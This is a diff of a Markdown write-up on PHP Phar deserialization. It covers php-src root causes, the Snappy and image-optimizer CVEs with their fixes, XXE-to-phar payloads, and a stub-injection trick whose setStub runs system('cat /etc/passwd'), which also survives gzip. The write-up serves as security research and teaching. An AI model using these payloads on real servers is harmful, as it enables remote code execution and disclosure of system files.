@@ -12,6 +12,7 @@ authors:
   - winky
 ---
 
+
 ## Introduction
 
 **Phar Deserialization** is a popular bug related to file upload vulnerability and unsafe object deserialization. While this issue is mostly resolved in the latest PHP versions, some functions can still trigger it and pose a risk to our server.
@@ -27,9 +28,16 @@ authors:
 
 ![image](https://hackmd.io/_uploads/HJpzbTWOxx.png)
 
-This is the detailed structure of this file
+This is the detailed structure of this manifest
 
 ![image](https://hackmd.io/_uploads/By2TMa-uxl.png)
+
+Manifest structure of the above phar file: 
+
+![image](https://hackmd.io/_uploads/S1PFKLuuxl.png)
+
+So there is a serialized object in metadata. We should keep an eye on it.
+
 
 ### How to make a phar file
 
@@ -124,13 +132,15 @@ echo serialize($ser);
 
 ## Phar Deserialization
 
-In PHP <= 7.4, many file-related functions will automatically deserialize a Phar's metadata if accessed via phar://. Those functions are 
+### How it works ?
+
+Remember the serialized metadata in phar manifest ? So what if we put a malicious object and deserialize it ? In PHP <= 7.4, many file-related functions will automatically deserialize a Phar's metadata if accessed via phar://. Those functions are 
 
 ![image](https://hackmd.io/_uploads/rynpNRZdel.png)
 
-and move_uploaded_file, mime_content_type, etc.
+and move_uploaded_file, mime_content_type, readgzfile, md5_file, gzopen, gzfile, etc.
 
-POC: 
+### POC 
 
 If I use the previous context and create a PHAR file like:
 
@@ -162,9 +172,74 @@ PHP8:
 
 PHP7.4:
 
-![image](https://hackmd.io/_uploads/HkRjKA-ull.png)
+![image](https://hackmd.io/_uploads/Hk2Vdw__eg.png)
 
 => So this bug is still present in PHP 7.4 and has been fixed in PHP 8.
+
+### Root cause
+
+File accessed functions like filesize, file_get_contents, file_exist use those macros to open wrapper
+
+```bash
+root@8cf4041156a5:~/php-src# grep "define php_stream_open_wrapper" main/php_streams.h 
+#define php_stream_open_wrapper_rel(path, mode, options, opened) _php_stream_open_wrapper_ex((path), (mode), (options), (opened), NULL STREAMS_REL_CC)
+#define php_stream_open_wrapper_ex_rel(path, mode, options, opened, context) _php_stream_open_wrapper_ex((path), (mode), (options), (opened), (context) STREAMS_REL_CC)
+#define php_stream_open_wrapper(path, mode, options, opened)    _php_stream_open_wrapper_ex((path), (mode), (options), (opened), NULL STREAMS_CC)
+#define php_stream_open_wrapper_ex(path, mode, options, opened, context)        _php_stream_open_wrapper_ex((path), (mode), (options), (opened), (context) STREAMS_CC)
+```
+
+We can find it in many php functions
+
+```bash
+root@8cf4041156a5:~/php-src# grep "php_stream_open_wrapper" ext/standard/file.c
+        md.stream = php_stream_open_wrapper(filename, "rb",
+        stream = php_stream_open_wrapper_ex(filename, "rb",
+        stream = php_stream_open_wrapper_ex(filename, mode, ((flags & PHP_FILE_USE_INCLUDE_PATH) ? USE_PATH : 0) | REPORT_ERRORS, NULL, context);
+        stream = php_stream_open_wrapper_ex(filename, "rb", (use_include_path ? USE_PATH : 0) | REPORT_ERRORS, NULL, context);
+        stream = php_stream_open_wrapper_ex(filename, mode, (use_include_path ? USE_PATH : 0) | REPORT_ERRORS, NULL, context);
+        stream = php_stream_open_wrapper_ex(filename, "rb", (use_include_path ? USE_PATH : 0) | REPORT_ERRORS, NULL, context);
+        srcstream = php_stream_open_wrapper_ex(src, "rb", src_flg | REPORT_ERRORS, NULL, ctx);
+        deststream = php_stream_open_wrapper_ex(dest, "wb", REPORT_ERRORS, NULL, ctx);
+```
+
+When a phar:// wrapper is opened, it attempts to parse its metadata and uses a function called [php_var_unserialize](https://github.com/php/php-src/blob/PHP-7.4.33/ext/phar/phar.c#L621)
+
+```c
+int phar_parse_metadata(char **buffer, zval *metadata, uint32_t zip_metadata_len) /* {{{ */
+{
+	php_unserialize_data_t var_hash;
+
+	if (zip_metadata_len) {
+		const unsigned char *p;
+		unsigned char *p_buff = (unsigned char *)estrndup(*buffer, zip_metadata_len);
+		p = p_buff;
+		ZVAL_NULL(metadata);
+		PHP_VAR_UNSERIALIZE_INIT(var_hash);
+
+		if (!php_var_unserialize(metadata, &p, p + zip_metadata_len, &var_hash)) {
+			efree(p_buff);
+			PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
+			zval_ptr_dtor(metadata);
+			ZVAL_UNDEF(metadata);
+			return FAILURE;
+		}
+		efree(p_buff);
+		PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
+
+		if (PHAR_G(persist)) {
+			/* lazy init metadata */
+			zval_ptr_dtor(metadata);
+			Z_PTR_P(metadata) = pemalloc(zip_metadata_len, 1);
+			memcpy(Z_PTR_P(metadata), *buffer, zip_metadata_len);
+			return SUCCESS;
+		}
+	} else {
+		ZVAL_UNDEF(metadata);
+	}
+
+	return SUCCESS;
+}
+```
 
 ## CVE-2023-28115 and CVE-2023-41330
 
@@ -192,7 +267,66 @@ $snappy->generateFromHtml('<h1>Hello</h1>', 'a.pdf');
 
 ### Vulnerable function
 
-From version 1.4.1 and earlier, the generateFromHtml() function calls ([file_exist function in Snappy](https://github.com/KnpLabs/snappy/blob/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy/AbstractGenerator.php#L670)). So, what happens if we pass a phar:// wrapper stream to it?
+From version 1.4.1 and earlier, the generateFromHtml() function calls ([file_exist function in Snappy](https://github.com/KnpLabs/snappy/blob/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy/AbstractGenerator.php#L670)). We need to see the source code of generateFromHtml:
+
+```php
+public function generateFromHtml($html, $output, array $options = [], $overwrite = false)
+{
+$fileNames = [];
+if (\is_array($html)) {
+    foreach ($html as $htmlInput) {
+        $fileNames[] = $this->createTemporaryFile($htmlInput, 'html');
+    }
+} else {
+    $fileNames[] = $this->createTemporaryFile($html, 'html');
+}
+
+$this->generate($fileNames, $output, $options, $overwrite);
+}
+```
+
+This calls the generate() method:
+
+```php
+public function generate($input, $output, array $options = [], $overwrite = false)
+{
+
+    $this->prepareOutput($output, $overwrite);
+
+    $command = $this->getCommand($input, $output, $options);
+
+...
+```
+
+Here, $output is passed to prepareOutput(), which contains:
+
+```php
+protected function prepareOutput($filename, $overwrite)
+{
+    $directory = \dirname($filename);
+
+    if ($this->fileExists($filename)) {
+        if (!$this->isFile($filename)) {
+            throw new InvalidArgumentException(\sprintf('The output file \'%s\' already exists and it is a %s.', $filename, $this->isDir($filename) ? 'directory' : 'link'));
+        }
+        if (false === $overwrite) {
+            throw new FileAlreadyExistsException(\sprintf('The output file \'%s\' already exists.', $filename));
+        }
+        if (!$this->unlink($filename)) {
+            throw new RuntimeException(\sprintf('Could not delete already existing output file \'%s\'.', $filename));
+        }
+    } elseif (!$this->isDir($directory) && !$this->mkdir($directory)) {
+        throw new RuntimeException(\sprintf('The output file\'s directory \'%s\' could not be created.', $directory));
+    }
+}
+```
+
+And the fileExists() method internally calls PHP’s native file_exists() function
+
+![image](https://hackmd.io/_uploads/HJ_Jjv__el.png)
+
+
+file_exists is called and it's one of the file accessed function above. So, what happens if we pass a phar:// wrapper stream to it?
 
 ### POC
 
@@ -224,11 +358,11 @@ try{
 ?>
 ```
 
-![image](https://hackmd.io/_uploads/SkQDbJz_gl.png)
+![image](https://hackmd.io/_uploads/r1XAOwuuxe.png)
 
 ### Is it fixed?
 
-This patch was committed on the version 1.4.2 to fix CVE-2023-28115: [CVE-2023-28115 fix](https://github.com/KnpLabs/snappy/commit/1ee6360cbdbea5d09705909a150df7963a88efd6)
+This patch was committed on the version 1.4.2 to fix CVE-2023-28115: [CVE-2023-28115 fix](https://github.com/KnpLabs/snappy/commit/1ee6360cbdbea5d09705909a150df7963a88efd6). Now prepareOutput function will checks if phar:// is in filename or not
 
 ![image](https://hackmd.io/_uploads/HkLAW1MOxl.png)
 
@@ -243,20 +377,8 @@ POC:
 
 ```php
 <?php
-class User{
-    private $name;
-    private $age;
-    private $func = "touch";
-    function __construct($name, $age){
-        $this->name = $name;
-        $this->age = $age;
-    }
-    function __destruct(){
-        call_user_func( $this->func, 'user/'.$this->name.'.json' );
-    }
-}
 
-require __DIR__ . '/vendor/autoload.php';
+...
 
 use Knp\Snappy\Pdf;
 
@@ -267,7 +389,7 @@ try{
 ?>
 ```
 
-![image](https://hackmd.io/_uploads/rkOjQkzdll.png)
+![image](https://hackmd.io/_uploads/Sy26hD_uxx.png)
 
 And this is CVE-2023-41330. After that a commit to use parse_url on version 1.4.3 have fixed both above CVE
 
@@ -297,9 +419,47 @@ $optimizerChain->optimize($pathToImage);
 
 ### Vulnerable function
 
-In version 1.7.2, the optimize() function uses this function to check whether the image exists. https://github.com/Sonicrrrr/image-optimizer/blob/284a082b1814a846560ee1c91360bbdf3b4cb885/src/Image.php#L19
+From version 1.7.2 and earlier, the optimize() function uses this function to check whether the image exists. [file_exists in image-optimizer version 1.7.2](https://github.com/spatie/image-optimizer/blob/62f7463483d1bd975f6f06025d89d42a29608fe1/src/Image.php#L13). We will look at optimize() in OptimizerChain.php
 
-And it also triggers phar deserialization
+```php
+public function optimize(string $pathToImage, string $pathToOutput = null)
+{
+    if ($pathToOutput) {
+        copy($pathToImage, $pathToOutput);
+
+        $pathToImage = $pathToOutput;
+    }
+
+    $image = new Image($pathToImage);
+
+    $this->logger->info("Start optimizing {$pathToImage}");
+
+    foreach ($this->optimizers as $optimizer) {
+        $this->applyOptimizer($optimizer, $image);
+    }
+}
+```
+
+It will create an object Image based on $pathToImage which we are able to manipulate. And this is Image class
+
+```php
+class Image
+{
+    protected $pathToImage = '';
+
+    public function __construct(string $pathToImage)
+    {
+        if (! file_exists($pathToImage)) {
+            throw new InvalidArgumentException("`{$pathToImage}` does not exist");
+        }
+
+        $this->pathToImage = $pathToImage;
+    }
+
+...
+```
+
+We can see file_exists when we create an Image object and it also triggers phar deserialization.
 
 ### POC
 
@@ -324,15 +484,39 @@ use Spatie\ImageOptimizer\OptimizerChainFactory;
 
 $optimizerChain = OptimizerChainFactory::create();
 
-$pathToImage = "phar://test.phar";
-
-$optimizerChain->optimize($pathToImage);
+$optimizerChain->optimize("phar://test.phar");
 ?>
 ```
 
 There are lots of warnings, but it still results in RCE on the server.
 
-![image](https://hackmd.io/_uploads/HyblPJMOlg.png)
+![image](https://hackmd.io/_uploads/r1T90wudgl.png)
+
+### Fixing
+
+Version 1.7.3 of this library fixes this CVE by using regex to split url and allowes only file:// protocol [CVE-2024-34515](https://github.com/spatie/image-optimizer/blob/d4f0d09c44700c78d1718cd40da404b1c800b935/src/Image.php#L10)
+
+```php
+class Image
+{
+    protected $pathToImage = '';
+    protected const ALLOWED_PROTOCOLS = ['file'];
+
+    protected const WINDOWS_LOCAL_FILENAME_REGEX = '/^[a-z]:(?:[\\\\\/]?(?:[\w\s!#()-]+|[\.]{1,2})+)*[\\\\\/]?/i';
+
+public function __construct(string $pathToImage)
+{
+    if (! $this->isProtocolAllowed($pathToImage)) {
+        throw new InvalidArgumentException(\sprintf('The output file scheme is not supported. Expected one of [\'%s\'].', \implode('\', \'', self::ALLOWED_PROTOCOLS)));
+    }
+
+    if (! file_exists($pathToImage)) {
+        throw new InvalidArgumentException("`{$pathToImage}` does not exist");
+    }
+
+    $this->pathToImage = $pathToImage;
+}
+```
 
 ### Challenge
 
@@ -344,7 +528,7 @@ Phar deserialization in PHP does not depend on the file extension. That means ev
 
 POC:
 
-![image](https://hackmd.io/_uploads/rJ1jukG_le.png)
+![image](https://hackmd.io/_uploads/SkB3bdOull.png)
 
 However, you can't use a file without a proper extension (e.g., test, abc, or test,abc), because PHP functions like pathinfo() rely on file extensions to determine behavior.
 
@@ -362,9 +546,107 @@ $phar->setMetadata($obj);
 $phar->stopBuffering();
 ```
 
-![image](https://hackmd.io/_uploads/HJ8zx4Gule.png)
+![image](https://hackmd.io/_uploads/HklUGddugl.png)
 
 `Add appropriate magic bytes to fool MIME detection. => Bypass the mime_content_type() function`
+
+## XXE to Phar deserialization
+
+Imagine that you have XXE error but you can only read local files(LFI). However, with file upload and phar deserialization you can get ... RCE. These are some cases to exploit
+
+```php
+$xml = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "phar://test.phar">]><root>&xxe;</root>';
+
+$data = simplexml_load_string($xml, "SimpleXMLElement", LIBXML_NOENT);
+```
+
+```php
+$xml = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "phar://test.phar">]><root>&xxe;</root>';
+
+$data = new SimpleXMLElement($xml, 2, 0);
+```
+
+```php
+$xml = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "phar://test.phar">]><root>&xxe;</root>';
+
+$dom = new DOMDocument();
+$dom->loadXML($xml,LIBXML_NOENT);
+```
+
+### POC
+
+![image](https://hackmd.io/_uploads/Sk4rkFudee.png)
+
+### Root cause
+
+In PHP’s libxml extension, during request initialization (PHP_RINIT_FUNCTION(libxml)), the XML parser is configured to use php_libxml_input_buffer_create_filename for handling file accesses:
+
+```c
+static PHP_RINIT_FUNCTION(libxml)
+{
+	if (_php_libxml_per_request_initialization) {
+		/* report errors via handler rather than stderr */
+		xmlSetGenericErrorFunc(NULL, php_libxml_error_handler);
+		xmlParserInputBufferCreateFilenameDefault(php_libxml_input_buffer_create_filename);
+		xmlOutputBufferCreateFilenameDefault(php_libxml_output_buffer_create_filename);
+	}
+```
+
+When an XML document references an external resource, the parser calls:
+
+```c
+php_libxml_input_buffer_create_filename(const char *URI, xmlCharEncoding enc)
+{
+	xmlParserInputBufferPtr ret;
+	void *context = NULL;
+
+	if (LIBXML(entity_loader_disabled)) {
+		return NULL;
+	}
+
+	if (URI == NULL)
+		return(NULL);
+
+	context = php_libxml_streams_IO_open_read_wrapper(URI);
+
+	if (context == NULL) {
+		return(NULL);
+	}
+    
+    
+    ...
+```
+
+This function opens the target URI via:
+
+```c
+static void *php_libxml_streams_IO_open_read_wrapper(const char *filename)
+{
+	return php_libxml_streams_IO_open_wrapper(filename, "rb", 1);
+}
+```
+
+And it calls php_libxml_streams_IO_open_wrapper. Now the ret_val use php_stream_open_wrapper_ex to extract the wrapper and if we pass phar:// to it deserialization happens
+
+```c
+static void *php_libxml_streams_IO_open_wrapper(const char *filename, const char *mode, const int read_only)
+{
+	php_stream_statbuf ssbuf;
+	php_stream_context *context = NULL;
+	php_stream_wrapper *wrapper = NULL;
+	char *resolved_path;
+    
+    
+        ...
+        
+        ret_val = php_stream_open_wrapper_ex(path_to_open, (char *)mode, REPORT_ERRORS, NULL, context); 
+        
+        ...
+        
+        return ret_val;
+}
+```
+
 
 ## Phar deserialization and gadget chains
 
@@ -424,12 +706,47 @@ Now use `php -d phar.readonly=0 chain.php` to create phar file and you will get 
 
 ![image](https://hackmd.io/_uploads/rkkZayzOxl.png)
 
+## Phar Stub Bypass with gzip
+
+This exploit still works in PHP 8 and does not involve deserialization.
+
+Remember stub? It’s the PHP code at the beginning of a Phar archive that ends with __HALT_COMPILER();. So what if we inject PHP code before it ?
+
+```php
+<?php
+
+$obj = 1;
+$phar = new Phar("test.phar");
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('<?php system("cat /etc/passwd"); __HALT_COMPILER(); ?>');
+$phar->setMetadata($obj);
+$phar->stopBuffering();
+
+?>
+```
+
+So it still works to run PHP code
+
+![image](https://hackmd.io/_uploads/H1FxW9OOxl.png)
+
+But what if we gzip this file ??
+
+![image](https://hackmd.io/_uploads/SJSNbqddel.png)
+
+Yeah it keeps working. 
+
+How about gzip of gzip ????
+
+![image](https://hackmd.io/_uploads/rJeD-cOull.png)
+
+This is really cool. So we can use this to include and run php code without `<?php?>` tag
 
 ## Fixing
 
 Starting from PHP 8, this Phar deserialization bug is no longer exploitable in the same way. https://www.php.net/manual/en/migration80.incompatible.php#migration80.incompatible.phar
 
-Pull Request for the fix: [php/php-src#5855](https://github.com/php/php-src/pull/5855/commits/28417b781c5f112c667b596957289f752ee99259)
+Pull Request for the fix: [php/php-src#5855](https://github.com/php/php-src/pull/5855/commits/28417b781c5f112c667b596957289f752ee99259). They use phar_metadata_tracker to track when deserialization needed.
 
 However, the Phar::getMetadata() function still performs unserialize() on the internal metadata — so you must be careful when using this function, especially with user-controlled input.
 
